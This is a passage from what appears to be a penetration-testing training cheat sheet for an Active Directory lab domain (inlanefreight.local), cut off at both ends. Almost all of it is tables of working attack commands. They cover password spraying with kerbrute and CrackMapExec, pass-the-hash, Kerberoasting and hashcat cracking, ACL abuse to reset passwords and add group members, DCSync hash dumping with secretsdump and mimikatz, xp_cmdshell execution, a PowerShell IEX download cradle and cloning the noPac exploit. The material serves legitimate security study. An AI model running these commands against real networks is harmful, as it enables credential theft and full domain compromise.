cleaner.</td></tr><tr><td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td><td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td><td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td><td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td></tr><tr><td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td></tr></tbody></table><h1 id="Enumerating-Security-Controls"><a href="#Enumerating-Security-Controls" class="headerlink" title="Enumerating Security Controls"></a>Enumerating Security Controls</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td></tr><tr><td><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed Enumeration"></a>Credentialed Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td><td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td></tr><tr><td><code> rpcclient $&gt; queryuser 0x457</code></td><td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; enumdomusers</code></td><td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td></tr><tr><td><code>psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></td><td>Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></td><td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>windapsearch.py -h</code></td><td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td><td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td><td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Enumeration-by-Living-Off-the-Land"><a href="#Enumeration-by-Living-Off-the-Land" class="headerlink" title="Enumeration by Living Off the Land"></a>Enumeration by Living Off the Land</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td></tr><tr><td><code>Import-Module ActiveDirectory</code></td><td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td></tr><tr><td><code>Get-ADDomain</code></td><td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></td><td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Filter * | select name</code></td><td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to search for a specifc group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Export-PowerViewCSV</code></td><td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td></tr><tr><td><code>ConvertTo-SID</code></td><td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it’s <code>SID</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-Domain</code></td><td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainController</code></td><td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser</code></td><td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainComputer</code></td><td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup</code></td><td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainOU</code></td><td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO</code></td><td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetShare</code></td><td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetSession</code></td><td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Test-AdminAccess</code></td><td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainShare</code></td><td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ForestTrust</code></td><td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>PowerView script that enumerates users who are in groups outside of the user’s domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>PowerView script that enumerates groups with users outside of the group’s domain and returns each foreign member. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></td><td>PowerView script used to list all the members of a target group (<code>&quot;Domain Admins&quot;</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td><td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td></tr><tr><td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td><td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Transfering-Files"><a href="#Transfering-Files" class="headerlink" title="Transfering Files"></a>Transfering Files</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td></tr><tr><td><code>&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://172.16.5.222/SharpHound.exe&#39;)&quot;</code></td><td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td></tr><tr><td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td><td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m pip install .</code></td><td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -h</code></td><td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td>Impacket tool used to download&#x2F;request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td>Impacket tool used to download&#x2F;request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td>Impacket tool used to download&#x2F;request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>setspn.exe -Q */*</code></td><td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</code></td><td>PowerShell script used to download&#x2F;request the TGS ticket of a specific user from a Windows-based host.</td></tr><tr><td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></td><td>Used to download&#x2F;request all TGS tickets from a WIndows-based host.</td></tr><tr><td><code>mimikatz # base64 /out:true</code></td><td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td></tr><tr><td><code>kerberos::list /export </code></td><td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td></tr><tr><td><code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </code></td><td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td></tr><tr><td><code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></td><td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td></tr><tr><td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td></tr><tr><td><code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code></td><td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td></tr><tr><td><code>cat sqldev_tgs_hashcat </code></td><td>Used to view the prepared hash from a Linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt </code></td><td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  Get-DomainUser * -spn | select samaccountname</code></td><td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td><td>PowerView tool used to download&#x2F;request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td><td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td></tr><tr><td><code>cat .\ilfreight_tgs.csv</code></td><td>Used to view the contents of the .csv file from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe</code></td><td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /stats</code></td><td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap</code></td><td>Used to request&#x2F;download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td>Used to request&#x2F;download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td><td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td></tr></tbody></table><h1 id="ACL-Enumeration-amp-Tactics"><a href="#ACL-Enumeration-amp-Tactics" class="headerlink" title="ACL Enumeration &amp; Tactics"></a>ACL Enumeration &amp; Tactics</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley</code></td><td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125;</code></td><td>Used to find all Windows domain objects that the user has rights over by mapping the user’s <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td></tr><tr><td><code>$guid= &quot;00299570-246d-11d0-a768-00aa006e0529&quot;   Get-ADObject -SearchBase &quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot; -Filter &#123;ObjectClass -like &#39;ControlAccessRight&#39;&#125; -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?&#123;$_.rightsGuid -eq $guid&#125; | fl</code></td><td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125; </code></td><td>Used to discover a domain object’s ACL by performing a search based on GUID’s (<code>-ResolveGUIDs</code>) from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td><td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td></tr><tr><td><code>foreach($line in [System.IO.File]::ReadLines(&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;)) &#123;get-acl  &quot;AD:\$(Get-ADUser $line)&quot; | Select-Object Path -ExpandProperty Access | Where-Object &#123;$_.IdentityReference -match &#39;INLANEFREIGHT\\wley&#39;&#125;&#125;</code></td><td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td></tr><tr><td><code>$SecPassword = ConvertTo-SecureString &#39;&lt;PASSWORD HERE&gt;&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\wley&#39;, $SecPassword) </code></td><td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td></tr><tr><td><code>$damundsenPassword = ConvertTo-SecureString &#39;Pwn3d_by_ACLs!&#39; -AsPlainText -Force</code></td><td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td></tr><tr><td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Help Desk Level 1&quot; -Properties * | Select -ExpandProperty Members</code></td><td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>Add-DomainGroupMember -Identity &#39;Help Desk Level 1&#39; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName</code></td><td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @&#123;serviceprincipalname=&#39;notahacker/LEGIT&#39;&#125; -Verbose</code></td><td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td></tr><tr><td><code>Remove-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>ConvertFrom-SddlString</code></td><td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -Identity adunn  | select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></td><td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>$sid= &quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#39;Replication-Get&#39;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td><td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user’s replication rights. Performed from a Windows-based host.</td></tr><tr><td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td></tr></tbody></table><h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>$password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</code></td><td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td></tr><tr><td><code>$cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</code></td><td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td></tr><tr><td><code>evil-winrm -i 10.129.201.234 -u forend</code></td><td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td></tr><tr><td><code>Import-Module .\PowerUpSQL.ps1</code></td><td>Used to import the <code>PowerUpSQL</code> tool.</td></tr><tr><td><code>Get-SQLInstanceDomain</code></td><td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td></tr><tr><td><code>Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</code></td><td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query &#39;Select @@version&#39;</code>) from a Windows-based host.</td></tr><tr><td><code>mssqlclient.py</code></td><td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td></tr><tr><td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td></tr><tr><td><code>SQL&gt; help</code></td><td>Used to display mssqlclient.py options once connected to a MSSQL server.</td></tr><tr><td><code>SQL&gt; enable_xp_cmdshell</code></td><td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td></tr><tr><td><code>xp_cmdshell whoami /priv</code></td><td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td></tr></tbody></table><h1 id="NoPac"><a href="#NoPac" class="headerlink" title="NoPac"></a>NoPac</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td>Runs <code>scanner.py</code> to check if 